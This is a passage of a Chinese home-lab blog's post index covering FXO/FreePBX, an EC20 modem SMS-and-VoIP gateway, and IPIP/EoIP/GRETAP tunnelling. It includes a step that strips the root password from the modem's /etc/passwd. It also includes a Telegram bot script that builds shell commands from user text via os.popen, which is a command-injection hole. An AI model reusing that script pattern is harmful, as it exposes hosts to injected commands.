href=\"https://www.freepbx.org/downloads/\"\u003eFreePBX发行版\u003c/a\u003e。（根据网上的讨论，fxo及freepbx对机器的性能要求很低，甚至十多年前的酷睿2+2G内存都能正常运行）\u003c/li\u003e\n\u003cli\u003e*（可选）*若干台IP电话，可在闲鱼上以「思科/Cisco IP电话」之类的关键词搜索。大概能搜到60-100元一台的\u003ca href=\"https://www.cisco.com/c/en/us/products/collaboration-endpoints/unified-ip-phone-7900-series/index.html\"\u003eCP7900\u003c/a\u003e或\u003ca href=\"https://www.cisco.com/c/en/us/products/collaboration-endpoints/unified-ip-phone-8900-series/index.html\"\u003eCP8900\u003c/a\u003e系列的电话机，价格甚至比某些接RJ11的传统电话机还便宜。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"配置\"\u003e配置\u003c/h2\u003e\n\u003ch3 id=\"fxo卡\"\u003eFXO卡\u003c/h3\u003e\n\u003cp\u003eFXO卡的硬件是通过\u003ca href=\"https://wiki.asterisk.org/wiki/display/DAHDI/DAHDI\"\u003edahdi\u003c/a\u003e进行驱动的，freepbx已经自带了这些驱动，理论上插上fxo卡之后，dahdi就能识别出来了。同时，我们也可以通过\u003ccode\u003edahdi_scan\u003c/code\u003e来验证一下：\u003c/p\u003e","title":"使用FXO卡配合asterisk及freepbx将固定电话信号转为VoIP"},{"content":"由于内地各种互联网服务与手机强绑定的前提下，每个人手上的手机号码变得越来越多。在互联网上，早已有包括telegram-sms，SMS-forwarder等不同的应用被用来解决不想随身带着某张手机卡，却还需要拿他接收发送短信的场景。不过美中不足的是，由于这些应用均需要安装在手机上，这些短信转发应用均存在因国产android系统严格的后台限制被休眠导致无法转发短信的情况。同时，将带电池的旧手机长期插电也有一些安全隐患（电池鼓包等）。最重要的是，这些短信转发转发软件无法转移呼入和呼出的电话。为了解决上述的这些问题，在本文中，笔者基于EC20和东拼西凑的软件，实现了通过telegram等即时通讯软件收发短信，并通过SIP客户端从互联网呼出和接听电话。\n笔者调研的其他方案 多卡宝 一到两年前非常流行的SIM卡托管方案，可以插4张卡，并且同时可待机两张卡，使用自有app转发短信及通话。根据FCCID的PDF，其使用了高通Snapdragon 210处理器，其常见于一些4G老人机上，鉴于此，笔者怀疑多卡宝使用了魔改的android系统。但在2021年下半年，多卡宝疑似因监管原因（可能是被用于电信诈骗？）被国内电商下架，并且因短信语音均需要经过三方服务器，也有一些安全隐患。\nGOIP设备 俗称猫池，设备太贵，笔者负担不起。\n材料及成本 EC20及周边设备 ec20-taobao 移远出品的一款4G卡，支持LTE Cat4，使用Snapdragon X5 LTE Modem，这个卡有很多个版本，有部分版本只带上网功能，不能接打电话和发短信。如果需要收发短信和打电话，请尽量购买最高级的EC20CEFAG-512-SGNS，买mini-pcie接口的 ，移远的淘宝店买大概200一片，闲鱼购买大约50-60一片。\n每张卡还需要另外加大约25元买一张4G模块转接板Mini PCIE转USB的卡座，卡座上有插SIM的地方（卡座一般用的是Mini Sim，如果只有nanosim的话可以去买一个卡套）。在淘宝上搜索「4G模块转接板Mini PCIE转USB」即可。\n除此之外，还需购买若干根IPEX转SMA转接线及SMA接口的4G天线，淘宝上搜相应关键词即可。\n电脑主机 要求不高，一般只要有usb口和有线网口即可，建议安装pve或esxi等虚拟机管理系统。（树莓派不一定行，因为供电不足）。笔者单独去闲鱼上买了一台Optiplex 3050mff，配i3-6100T，8G内存，256G SSD，大概花费了600元。\n配置EC20 确认EC20能够正常读取SIM卡 关闭SIM卡的PIN，插入卡座，把EC20接上天线并通电，此时应该可以在/dev里看到若干个ttyUSB端口：\nttyUSB0 ttyUSB1 PCM语音，GPS信号 ttyUSB2 控制命令 ttyUSB3 使用minicom打开ttyUSB2端口：\nminicom -D /dev/ttyUSB2 # 输入ATI看一下EC20的版本号： ATI Quectel EC20F Revision: EC20CEFAGR06A15M4G 如果一切正常的话，可以先重置一遍EC20，以防上一个用户在卡内设置了错误的配置（但不要经常重置EC20，重置操作对dongle的闪存有损耗）。\n重置模块 at+qprtpara=3 重启 AT+CFUN=1,1 重置并重启完后，可以通过以下命令检查一下SIM卡是否已经注册成功了（下面的例子是联通的，其他运营商同理）：\nAT+COPS? +COPS: 0,0,\u0026#34;CHN-UNICOM\u0026#34;,7 AT+QNWINFO +QNWINFO: \u0026#34;FDD LTE\u0026#34;,\u0026#34;46001\u0026#34;,\u0026#34;LTE BAND 3\u0026#34;,1650 AT+QENG=\u0026#34;servingcell\u0026#34; +QENG: \u0026#34;servingcell\u0026#34;,\u0026#34;CONNECT\u0026#34;,\u0026#34;LTE\u0026#34;,\u0026#34;FDD\u0026#34;,460,01 配置VoLTE 随着三大运营商开始逐步退网2G及3G，为dongle配置VoLTE也变得十分必要了。以下流程参考了此PDF：\n打开ims AT+QCFG=\u0026#34;ims\u0026#34;,1 查看dongle内的mbn文件 AT+QMBNCFG=\u0026#34;List\u0026#34; +QMBNCFG: \u0026#34;List\u0026#34;,0,1,1,\u0026#34;ROW_Generic_3GPP\u0026#34;,0x05010824,201806201 +QMBNCFG: \u0026#34;List\u0026#34;,1,0,0,\u0026#34;OpenMkt-Commercial-CU\u0026#34;,0x05011510,201911151 +QMBNCFG: \u0026#34;List\u0026#34;,2,0,0,\u0026#34;OpenMkt-Commercial-CT\u0026#34;,0x0501131C,201911141 +QMBNCFG: \u0026#34;List\u0026#34;,3,0,0,\u0026#34;Volte_OpenMkt-Commercial-CMCC\u0026#34;,0x05012011,201904261 # 尽管这里列出了移动联通电信的VoLTE配置文件，但使用默认的自动选择CU/CT/CMCC并不能注册VoLTE，在摸索很久之后，笔者发现需要强制选择ROW_Generic_3GPP才能成功注册VoLTE。 关闭自动选择mbn文件 AT+QMBNCFG=\u0026#34;AutoSel\u0026#34;,0 反激活当前的mbn at+qmbncfg=\u0026#34;deactivate\u0026#34; 强制选择3gpp AT+QMBNCFG=\u0026#34;select\u0026#34;,\u0026#34;ROW_Generic_3GPP\u0026#34; 重启 AT+CFUN=1,1 可以再确认一下mbn的选择状态，如果ROW_Generic_3GPP的第二位和第三位都是1的话，说明dongle目前选择了这个配置 AT+QMBNCFG=\u0026#34;List\u0026#34; +QMBNCFG: \u0026#34;List\u0026#34;,0,1,1,\u0026#34;ROW_Generic_3GPP\u0026#34;,0x05010824,201806201 +QMBNCFG: \u0026#34;List\u0026#34;,1,0,0,\u0026#34;OpenMkt-Commercial-CU\u0026#34;,0x05011510,201911151 +QMBNCFG: \u0026#34;List\u0026#34;,2,0,0,\u0026#34;OpenMkt-Commercial-CT\u0026#34;,0x0501131C,201911141 +QMBNCFG: \u0026#34;List\u0026#34;,3,0,0,\u0026#34;Volte_OpenMkt-Commercial-CMCC\u0026#34;,0x05012011,201904261 重启完后检查ims的状态 AT+QCFG=\u0026#34;ims\u0026#34; 如果返回的是 +QCFG: \u0026#34;ims\u0026#34;,1,1 即为激活，如果是+QCFG: \u0026#34;ims\u0026#34;,1,0 说明没有激活 可选（激活UAC数字音频） 参考https://github.com/IchthysMaranatha/asterisk-chan-quectel/discussions/2：\nAT+QCFG=\u0026#34;usbcfg\u0026#34;,0x2C7C,0x0125,1,1,1,1,1,0,1 这个命令同时也会打开一个adb daemon，可以通过adb shell进到模块自带的一个android系统里。如果发现系统有密码的话（有无密码均不影响后续配置），可以用adb pull把dongle的/etc/passwd拉出来，去掉root的密码之后push回去。\n激活之后可以通过aplay -L查看有没有一个android设备。\ndmix:CARD=Android,DEV=0 Android, USB Audio Direct sample mixing device 安装asterisk虚拟机 freepbx自带的asterisk耦合了很多freepbx相关的配置，令笔者无从下手，同时centos似乎没有办法读取dongle的UAC接口，因此笔者参考quectel channel驱动作者的一篇讨论配置了一个简易的asterisk系统。笔者在这里使用的是Debian11，安装的是包管理器里自带的asterisk 16。安装asterisk之后记得把dongle的USB接口直通进虚拟机。\n安装asterisk和一些依赖 apt update apt install asterisk asterisk-dev adb git autoconf automake libsqlite3-dev build-essential libasound2-dev alsa-utils 下载asterisk-chan-quectel： git clone https://github.com/IchthysMaranatha/asterisk-chan-quectel cd asterisk-chan-quectel ./bootstrap ./configure --with-astversion=16 make make install 随后把uac/quectel.conf复制到/etc/asterisk里。并通过systemctl restart asterisk重启asterisk。\n输入asterisk -rvvv进入asterisk的cli界面并输入quectel show devices即可看到识别到的dongle了，也能看到dongle的imei和SIM卡的imsi：\n# asterisk -rvvv Asterisk 16.16.1~dfsg-1+deb11u1, Copyright (C) 1999 - 2018, Digium, Inc. and others. Created by Mark Spencer \u0026lt;markster@digium.com\u0026gt; Asterisk comes with ABSOLUTELY NO WARRANTY; type \u0026#39;core show warranty\u0026#39; for details. This is free software, with components licensed under the GNU General Public License version 2 and other licenses; you are welcome to redistribute it under certain conditions. Type \u0026#39;core show license\u0026#39; for details. ========================================================================= Connected to Asterisk 16.16.1~dfsg-1+deb11u1 currently running on debian-asterisk (pid = 1403) debian-asterisk*CLI\u0026gt; quectel show devices ID Group State RSSI Mode Submode Provider Name Model Firmware IMEI IMSI Number quectel0 0 Free 27 0 0 CHN-UNICOM EC20F EC20CEFAGR06A15M4 86XXXXX 46XXXXX Unknown debian-asterisk*CLI\u0026gt; 配置dialplan 直接参考驱动作者写的帖子，下载帖子里的sipext.zip，解压后放到/etc/asterisk下，同时修改一下/etc/asterisk/extensions.conf（请不要直接照抄！根据自己的实际情况和驱动作者的帖子修改）：\n[incoming-mobile] ;exten =\u0026gt; _.,1,Dial(SIP/70/100) ;same =\u0026gt; n,Hangup() exten =\u0026gt; sms,1,Verbose(Incoming SMS from ${CALLERID(num)} ${BASE64_DECODE(${SMS_BASE64})}) ;store exten =\u0026gt; sms,n,System(echo \u0026#39;${STRFTIME(${EPOCH},,%Y-%m-%d %H:%M:%S)} - ${QUECTELNAME} - ${CALLERID(num)}: ${BASE64_DECODE(${SMS_BASE64})}\u0026#39; \u0026gt;\u0026gt; /var/log/asterisk/sms.txt) ;for tg bot use exten =\u0026gt; sms,n,System(echo \u0026#39;${STRFTIME(${EPOCH},,%Y-%m-%d %H:%M:%S)} - ${QUECTELNAME} - ${CALLERID(num)}\\n${BASE64_DECODE(${SMS_BASE64})}\u0026#39; \u0026gt;\u0026gt; /var/log/asterisk/unread_sms/${STRFTIME(${EPOCH},,%Y%m%d%H%M%S)}-${CALLERID(num)}.txt) exten =\u0026gt; sms,n,Hangup() exten =\u0026gt; ussd,1,Verbose(Incoming USSD: ${BASE64_DECODE(${USSD_BASE64})}) exten =\u0026gt; ussd,n,System(echo \u0026#39;${STRFTIME(${EPOCH},,%Y-%m-%d %H:%M:%S)} - ${QUECTELNAME}: ${BASE64_DECODE(${USSD_BASE64})}\u0026#39; \u0026gt;\u0026gt; /var/log/asterisk/ussd.txt) exten =\u0026gt; ussd,n,Hangup() exten =\u0026gt; _.,1,Dial(SIP/70/100) exten =\u0026gt; s,n,Hangup() [Outbound-1001] exten =\u0026gt; _.,1,Dial(Quectel/quectel0/${EXTEN}) same =\u0026gt; n,Hangup() 修改完后再重启一次asterisk。\n测试收发短信 此时可以尝试发个短信给10010，测试一下收发短信：\n发短信（给10010发cxll） asterisk -rx \u0026#39;quectel sms quectel0 10010 \u0026#34;cxll\u0026#34;\u0026#39; 收短信 根据前面的dialplan，收到短信后，asterisk会直接把短信内容写进/var/log/asterisk/sms.txt，类似于这样：\ntail -f /var/log/asterisk/sms.txt 2022-10-01 00:00:00 - quectel0 - 10010: 【权益领取提醒】尊敬的用户，您已获得2个月视频会员体验资格（原价15元/月），腾讯、爱奇艺、优酷、芒果TV、QQ音乐等20款会员每月任选1款，点击 https://u.10010.cn 即可参与(活动规则详见页面说明，限48小时内参与，短信转发无效，已办理请忽略)。如需屏蔽，请在“广东联通”官方公众号内回复“TD”，首次关注可领4GB流量【广东联通】 如果需要进一步转发短信，直接读取这个文件，或者修改dialplan中输出短信的格式即可。\n用Telegram Bot自助收发短信 以下脚本都是用chatgpt写的，笔者用起来暂时没有遇到明显的问题：\n发短信 Systemd service:\n[Unit] Description=Outbound SMS service for TG-SMS Wants=network-online.target After=network-online.target [Service] Type=simple ExecStart=/opt/tg-sms/outbound/.venv/bin/python3 /opt/tg-sms/outbound/outbound-sms.py Restart=on-failure RestartSec=5 User=asterisk [Install] WantedBy=multi-user.target 脚本（需要安装老版本的python-telegram-bot pip install python-telegram-bot==13.15）：\nfrom telegram import Update, ForceReply from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext # We\u0026#39;ll use a dictionary to store each user\u0026#39;s state. user_data = {} # List of allowed user/group IDs. ALLOWED_IDS = [11111111] def send(update: Update, context: CallbackContext) -\u0026gt; None: if update.message.chat_id not in ALLOWED_IDS: update.message.reply_text(\u0026#39;您没有权限使用这个 bot。\u0026#39;) return if len(context.args) != 1: update.message.reply_text(\u0026#39;请按照以下格式发送命令：/send \u0026lt;phone_number\u0026gt;\u0026#39;) return user_data[update.message.chat_id] = {\u0026#39;phone_number\u0026#39;: context.args[0]} update.message.reply_text(\u0026#39;请输入您要发送的信息：\u0026#39;, reply_markup=ForceReply()) def cancel(update: Update, context: CallbackContext) -\u0026gt; None: user_data.pop(update.message.chat_id, None) update.message.reply_text(\u0026#39;操作已取消。\u0026#39;) def handle_message(update: Update, context: CallbackContext) -\u0026gt; None: if update.message.chat_id not in user_data: return if \u0026#39;message\u0026#39; not in user_data[update.message.chat_id]: user_data[update.message.chat_id][\u0026#39;message\u0026#39;] = update.message.text update.message.reply_text(\u0026#39;请确认信息：\\n手机号：{}\\n信息：{}\u0026#39;.format(user_data[update.message.chat_id][\u0026#39;phone_number\u0026#39;], user_data[update.message.chat_id][\u0026#39;message\u0026#39;]), reply_markup=ForceReply()) else: confirmation = update.message.text if confirmation.lower() == \u0026#39;yes\u0026#39;: import os result = os.popen(\u0026#39;asterisk -rx \\\u0026#39;quectel sms quectel0 {} \u0026#34;{}\u0026#34;\\\u0026#39;\u0026#39;.format(user_data[update.message.chat_id][\u0026#39;phone_number\u0026#39;], user_data[update.message.chat_id][\u0026#39;message\u0026#39;])).read() update.message.reply_text(\u0026#39;命令执行结果：\\n{}\u0026#39;.format(result)) else: update.message.reply_text(\u0026#39;操作已取消。\u0026#39;) user_data.pop(update.message.chat_id, None) def main() -\u0026gt; None: updater = Updater(token=\u0026#39;your_token\u0026#39;, use_context=True) dispatcher = updater.dispatcher dispatcher.add_handler(CommandHandler(\u0026#34;send\u0026#34;, send)) dispatcher.add_handler(CommandHandler(\u0026#34;cancel\u0026#34;, cancel)) dispatcher.add_handler(MessageHandler(Filters.text \u0026amp; ~Filters.command, handle_message)) updater.start_polling() updater.idle() if __name__ == \u0026#39;__main__\u0026#39;: main() 收短信 import requests import sys import urllib.parse import re # extract verify code def extract_verification_code(sms_text): # 定位到“验证码”关键词 keyword_index = sms_text.find(\u0026#39;验证码\u0026#39;) if keyword_index == -1: return None # 从关键词后开始匹配4-6位的数字 match = re.search(r\u0026#39;(\\d{4,6})\u0026#39;, sms_text[keyword_index:]) if match: return match.group(1) return None # tg tg_bot_token = \u0026#34;\u0026#34; tg_send_msg_url = \u0026#34;https://api.telegram.org/bot\u0026#34;+tg_bot_token+\u0026#34;/sendMessage\u0026#34; tg_receive_msg_url = \u0026#34;https://api.telegram.org/bot\u0026#34;+tg_bot_token+\u0026#34;/getUpdates\u0026#34; # wecom wecom_send_msg_url = \u0026#34;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=your-key\u0026#34; bark_send_msg_url = \u0026#34;https://api.day.app/bark-token/\u0026#34; def incoming_sms_tg(msg_text): send_body = {} send_body[\u0026#39;chat_id\u0026#39;] = \u0026#39;11111111\u0026#39; send_body[\u0026#39;text\u0026#39;] = msg_text requests.post(tg_send_msg_url, json=send_body) def incoming_sms_wecom(msg_text): send_body = {} send_body[\u0026#39;msgtype\u0026#39;] = \u0026#39;text\u0026#39; send_body[\u0026#39;text\u0026#39;] = {} send_body[\u0026#39;text\u0026#39;][\u0026#39;content\u0026#39;] = msg_text requests.post(wecom_send_msg_url, json=send_body) def incoming_sms_bark(msg_text): requests.get(bark_send_msg_url + urllib.parse.quote_plus(msg_text) + \u0026#34;?copy=\u0026#34; + extract_verification_code(msg_text)) def incoming(): msg_text = sys.argv[1] incoming_sms_wecom(msg_text) incoming_sms_bark(msg_text) incoming_sms_tg(msg_text) incoming() 安装freepbx虚拟机 去freepbx官网上下载freepbx的iso镜像（看起来是一个CentOS7）：https://www.freepbx.org/downloads/。使用镜像安装系统，安装时选择freepbx 16 with asterisk 18。安装完后用浏览器访问虚拟机的IP，设置初始的管理员密码（最开始可以暂不打开防火墙，方便配置）。\n添加分机号 在 Applications-Extensions 里，点击add extension- SIP extension，加一个200的extension（号码随意，只要不和asterisk虚拟机里的号码撞上了就行）：\n添加 sip extensions 剩下部分保持默认，点submit，并点击一下右上角的apply config。\n添加Trunk 添加之前，先按照前面的帖子的指引，修改asterisk虚拟机里的/etc/asterisk/sip.conf，把最底下70分机的host=192.168.x.x改成freepbx虚拟机的IP，重启asterisk。\n在freepbx的Connectivity-Trunks里添加一个SIP Trunk，配置如下，其他默认：\n名字随意，outbound CallerID改成asterisk虚拟机那边设置的数值（70） SIP server要改成asterisk虚拟机的IP 路由 在Connectivity-Outbound Routes里，新建路由，将出方向的路由都转发给前一步创建的SIP trunk：\noutbound-route 在Connectivity-Inbound Routes里，新建路由，将入方向的路由都转发给extensions-上面设置的分机号：\ninbound-route 如果未来连接了多个分机或者多个dongle，需要根据用户进行分流的话，可以详细配置上面的DID和CallerID来进行过滤。\n测试通话 下载一个免费版的zoiper，添加账户的时候用户名输入分机号@freepbx的IP，密码即上面设置的密码（注意不要输错了，freepbx默认有打开fail2ban，输错SIP密码也会触发fail2ban，还需要手动去删除iptables规则）。\n确认注册上了之后可以尝试通过zoiper呼出到10010或者是自己的电话，测试一下语音和按键的DTMF音有被识别到。如果是外部呼入dongle里的号码的电话，呼入到freepbx之后会被直接转移给分机，此时zeoiper会有提示，直接点接听即可。\n端口转发，SIP push等 对于sip，除了需要转发sip的默认端口（5201，可以在freepbx的设置里查看（settings - asterisk sip setting），还需要转发RTP端口。如果只想转发一个端口，可以考虑参考EC20 模块+Issabel 实现网络电话 - Hanako Blog使用IAX2 extension。SIP Push（在接到电话时在手机上弹推送）目前只有zoiper提供了比较方便的配置方式，但需收费，具体可参考 如何把SIM卡从手机中取出 – IAM-LC。\n使用模块上网 如果使用的手机卡包含流量，我们也可以一并配置模块的上网功能，以便在机器的有线/无线网络挂掉后，还能正常的转发短信和通话。\n首先，在连上串口后输入AT+QCFG=\u0026quot;usbnet\u0026quot;,1，设置usbnet模式为ECM（1是ECM，2是NDIS，3是RNDIS）\n接着，用AT+CFUN=1,1重启一下模块，随后查看ip a，应该能看到一个类似enxe2eeabcd123的接口，在这个接口上直接运行dhclient即可获取v4或v6地址。如果怕interface的名字经常变化，可以参考这个问题，把interface的名字根据MAC地址重命名成quectel-usbX这样方便管理的名字。\n3: quectel-usb0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000 link/ether ff:ff:ff:ff:ff:ff brd ff:ff:ff:ff:ff:ff inet 192.168.225.41/24 brd 192.168.225.255 scope global dynamic quectel-usb0 valid_lft 28802sec preferred_lft 28802sec inet6 2408::/64 scope global dynamic mngtmpaddr valid_lft forever preferred_lft forever inet6 fe80::/64 scope link valid_lft forever preferred_lft forever 其他 在不打开SIP客户端时，打到dongle上的电话会提示用户忙，需要使用前一节中提到的sip push的方式，或者保持客户端常开才能正常接到电话。 参考资料 EC20的AT指令集可以在https://www.quectel.com/ProductDownload/EC20.html处下载。 asterisk上的Quectel驱动： https://github.com/IchthysMaranatha/asterisk-chan-quectel/ https://gao.md/blog/2014/10/05/sms-gateway-setup-huawei-e1750-asterisk-chan-dongle/ https://iam.lc/2024/01/how-to-get-rid-of-sim.ping https://forums.quectel.com/t/ec25-e-mini-additional-mbn-files/13473/2 ","permalink":"https://blog.sparktour.me/posts/2022/10/08/quectel-ec20-asterisk-freepbx-gsm-gateway/","summary":"\u003cp\u003e由于内地各种互联网服务与手机强绑定的前提下，每个人手上的手机号码变得越来越多。在互联网上，早已有包括\u003ca href=\"https://github.com/telegram-sms/telegram-sms-china\"\u003etelegram-sms\u003c/a\u003e，\u003ca href=\"https://github.com/pppscn/SmsForwarder\"\u003eSMS-forwarder\u003c/a\u003e等不同的应用被用来解决不想随身带着某张手机卡，却还需要拿他接收发送短信的场景。不过美中不足的是，由于这些应用均需要安装在手机上，这些短信转发应用均存在因国产android系统严格的后台限制被休眠导致无法转发短信的情况。同时，将带电池的旧手机长期插电也有一些安全隐患（电池鼓包等）。最重要的是，这些短信转发转发软件无法转移呼入和呼出的电话。为了解决上述的这些问题，在本文中，笔者基于EC20和东拼西凑的软件，实现了通过telegram等即时通讯软件收发短信，并通过SIP客户端从互联网呼出和接听电话。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003chr\u003e\n\u003ch2 id=\"笔者调研的其他方案\"\u003e笔者调研的其他方案\u003c/h2\u003e\n\u003ch3 id=\"多卡宝\"\u003e\u003ca href=\"https://cn.ucloudlink.com/html/devices-simbox/\"\u003e多卡宝\u003c/a\u003e\u003c/h3\u003e\n\u003cp\u003e一到两年前非常流行的SIM卡托管方案，可以插4张卡，并且同时可待机两张卡，使用自有app转发短信及通话。根据\u003ca href=\"https://fccid.io/2AC88-C1-CN/Internal-Photos/Internal-Photos-4057106\"\u003eFCCID的PDF\u003c/a\u003e，其使用了高通\u003ca href=\"https://www.qualcomm.com/products/application/smartphones/qualcomm-2-series-mobile-platforms/snapdragon-processors-210\"\u003eSnapdragon 210\u003c/a\u003e处理器，其常见于一些4G老人机上，鉴于此，笔者怀疑多卡宝使用了魔改的android系统。但在2021年下半年，多卡宝疑似因监管原因（可能是被用于电信诈骗？）被国内电商下架，并且因短信语音均需要经过三方服务器，也有一些安全隐患。\u003c/p\u003e","title":"使用EC20模块配合asterisk及freepbx实现短信转发和网络电话"},{"content":"一直以来，本地路由器远程连接实验室的网络连接都是通过办公室ikuai软路由的L2TP连接实现的，但L2TP作为一个有状态协议，在遇到连接中断后恢复起来会比较麻烦，以及ikuai的L2TP server并不是很稳定，且没有办法分配IPv6。因此在近期，笔者将路由器连接实验室网络的组网方式改为了IPIP及EoIP的组合组网配置，并在很大程度上解决了上述问题。\n笔者同时提供了基于GRETAP的二层组网方案，此方案无需RouterOS设备，且性能开销更小，但配置相对略麻烦一些。\n为什么选择IPIP/IPOE？ IPIP/EoIP均是无状态协议，不会像L2TP一样，在网络波动后还需要重连。 理论上组网只需要EoIP即可，但学校的校园网阻断了GRE协议（EoIP基于GRE），需要在EoIP下再套一层协议以方便在学校的三层内网上传输，且这层套壳的协议最好能开销尽量小。因此笔者选择了IPIP协议。 网络结构图 网络结构图如下所示，其中红线的意思是Openwrt路由器下设备的数据的实际流向。\nnetwork-structure 配置IPIP隧道 RouterOS 侧 添加隧道：\ninterface \u0026gt; ip tunnel \u0026gt; add new name: ipip-openwrt local address: 10.20.1.1 remote address: 10.20.1.2 分配IP：\nIP \u0026gt; address \u0026gt; add new address: 9.0.0.1/24 network: 9.0.0.0 interface: ipip-openwrt Openwrt 侧 先安装IPIP相关的包：\nopkg update opkg install luci-proto-ipip 重启路由器，随后添加IPIP interface：\nNetwork \u0026gt; Interface \u0026gt; Add new interface... name: ipip1 protocal: IPv4-in-IPv4 (RFC2003) Remote IPv4 address or FQDN: 10.20.1.1 Local IPv4 address: 10.20.1.2 Bind interface: wan 同时也需要在Advanced Settings里去掉Use Default Gateway的选项。 给IPIP的interface分配一个静态IP：\nNetwork \u0026gt; Interface \u0026gt; Add new interface... name: ipip1static protocal: Static Device: ipip-ipip0 IPv4 address: 9.0.0.2/24 IPv4 gateway: 9.0.0.1 同时也需要在Advanced Settings里去掉Use Default Gateway的选项。 RouterOS和Openwrt一侧都配置好IPIP隧道后，可以互相ping一下对方的隧道IP （9.0.0.1， 9.0.0.2）来检查一下隧道是否通了。\n配置EoIP隧道及添加网桥 RouterOS 侧 添加隧道：\ninterface \u0026gt; EoIP tunnel \u0026gt; add new name: eoip-openwrt local address: 9.0.0.1 remote address: 9.0.0.2 tunnel ID: 150 （这个可以自己设置，和客户端一样就可以了） 添加网桥：\nbridge \u0026gt; add new name: bridge-eoip-ikuai 注意需要关闭dhcp snooping 给网桥添加端口：\nbridge \u0026gt; port \u0026gt; add new 把 eoip-openwrt 和连接ikuai的wan口都桥接到bridge-eoip-ikuai上 Openwrt 侧 安装EoIP的包：\nopkg update opkg install luci-app-eoip 重启路由器（可选），配置EoIP interface：\n于Network \u0026gt; EoIP Tunnel中配置，如下图所示：\neoip-config-openwrt 通过隧道分配IP IPv4 在Openwrt上新建一个interface，名字叫dhcpipip4，Protocal选择dhcp client，Device选择zeoip0（eoip的虚拟设备）勾选Use default gateway，防火墙划分到WAN区。\nopenwrt-dhcp-eoip IPv6 把WAN6的接口改为zeoip0即可。\n全部配置完成后，dhcpipip4和wan6的interface理论上均能取得上级路由器（ikuai）分配的IP。\n性能 笔者使用运行Openwrt 22.03.0的红米AX6s路由器，4*E5-2683 v4，内存2G的RouterOS（安装于ESXI虚拟机中）进行实际测试时，使用iperf3测速时峰值速度可达500Mbps左右。但笔者也注意到当客户端使用AX6s的无线连接进行测速时，iperf3的峰值速度则只有300Mbps左右，因此用此种方式组网对设备性能的要求可能较高。\n参考资料 https://github.com/bogdik/openwrt-linux-eoip https://help.mikrotik.com/docs/display/ROS/IPIP https://help.mikrotik.com/docs/display/ROS/EoIP ","permalink":"https://blog.sparktour.me/posts/2022/09/18/openwrt-mikrotik-layer2-network-with-ipip-and-eoip-tunnel/","summary":"\u003cp\u003e一直以来，本地路由器远程连接实验室的网络连接都是通过办公室ikuai软路由的L2TP连接实现的，但L2TP作为一个有状态协议，在遇到连接中断后恢复起来会比较麻烦，以及ikuai的L2TP server并不是很稳定，且没有办法分配IPv6。因此在近期，笔者将路由器连接实验室网络的组网方式改为了IPIP及EoIP的组合组网配置，并在很大程度上解决了上述问题。\u003c/p\u003e","title":"Openwrt 和 MikroTik RouterOS 路由器通过 IPIP/EOIP 进行二层组网"},{"content":"在前一篇文章中，笔者尝试了用Openwrt和RouterOS配合IPIP和EoIP隧道进行二层组网。但由于Openwrt的EoIP包是一个用户态的包，AX6s转发EoIP流量的性能并不是特别好（有线500Mbps，无线300Mbps），同时RouterOS也是一个收费系统，并不是所有人都会只为了组网来购买RouterOS的授权。鉴于此，笔者也在下文提供一种将IPoE替换为GRETAP协议进行二层组网的方案，此方案仅需一台运行于实验室内网的通用Linux设备即可（本文使用的是Debian11）。\nGRETAP？ 相比于GRE，GRETAP是类似EoIP的二层协议，因此我们同样可以将其用于二层组网。但很可惜RouterOS不支持GRETAP（怀疑是为了推广自家的EoIP协议），因此笔者只能使用另一台Linux设备和Openwrt路由器进行组网了。\n网络结构 此处依然简要列出一下代配置的网络结构：\n实验室路由器：ikuai，向实验室内设备分配192.168.102.0/24的IP。\n安装在实验室的Debian服务器：Debian 11，有两个网络接口，接口ens192获取校园网IP 10.20.1.1；接口ens224连接ikuai，配置前暂不分配IP。\n安装在宿舍的Openwrt路由器：Openwrt 22.03.0，WAN口分配10.20.1.2的校园网IP。\n配置IPIP隧道 由于学校内网封锁GRE协议，因此配置的第一步依然是在两侧设置用于承载GRETAP数据的的IPIP隧道。\nDebian 侧 启用IPv4转发：\necho \u0026#39;net.ipv4.ip_forward=1\u0026#39; \u0026gt;\u0026gt; /etc/sysctl.conf sysctl -p 安装ipip和桥接包：\napt install ipip bridge-utils 添加隧道：\n# 启用内核模块 modprobe ip_gre modprobe ipip # 添加隧道 ip tunnel add ipip2 local 10.20.2.223 remote 10.16.212.255 ip link set ipip2 up ip addr add 6.0.0.1/24 dev ipip2 Openwrt 侧 先安装IPIP相关的包：\nopkg update opkg install luci-proto-ipip 重启路由器，随后添加IPIP interface：\nNetwork \u0026gt; Interface \u0026gt; Add new interface... name: ipip1 protocal: IPv4-in-IPv4 (RFC2003) Remote IPv4 address or FQDN: 10.20.1.1 Local IPv4 address: 10.20.1.2 Bind interface: wan 同时也需要在Advanced Settings里去掉Use Default Gateway的选项。 给IPIP的interface分配一个静态IP：\nNetwork \u0026gt; Interface \u0026gt; Add new interface... name: ipip1static protocal: Static Device: ipip-ipip0 IPv4 address: 6.0.0.2/24 IPv4 gateway: 6.0.0.1 同时也需要在Advanced Settings里去掉Use Default Gateway的选项。 RouterOS和Openwrt一侧都配置好IPIP隧道后，可以互相ping一下对方的隧道IP （6.0.0.1， 6.0.0.2）来检查一下隧道是否通了。\n添加GRETAP隧道并桥接上级网口 Debian 侧 添加隧道：\n# gretap tunnel # 如果不添加IPIP隧道，可以将remote和local的ip根据实际情况修改 ip link add name gretap1 type gretap remote 6.0.0.2 local 6.0.0.1 # mtu请根据实际情况设置 ip link set gretap1 up mtu 1420 桥接配置：\n# bridge ip link add grebr0 type bridge ip link set ens224 master grebr0 ip link set gretap1 master grebr0 ip link set grebr0 up 不过笔者在配置时发现，按照上述配置拉起网桥后，GRETAP另一侧的Openwrt似乎无法收到ikuai发回的DHCP offer包，但在ens224端口上执行dhclient -i ens224 -4 -v后莫名其妙的解决了该问题。\nOpenwrt 侧 安装GRE相关的包并重启：\nopkg update opkg install luci-proto-gre ip-full 添加GRETAP interface：\nNetwork \u0026gt; Interface \u0026gt; Add new interface... name: gretap1 protocal: GRETAP Tunnel over IPv4 Remote IPv4 address or FQDN: 6.0.0.1 Local IPv4 address: 6.0.0.2 同时也需要在Advanced Settings里去掉Use Default Gateway的选项。 Debian 侧配置隧道开机自启 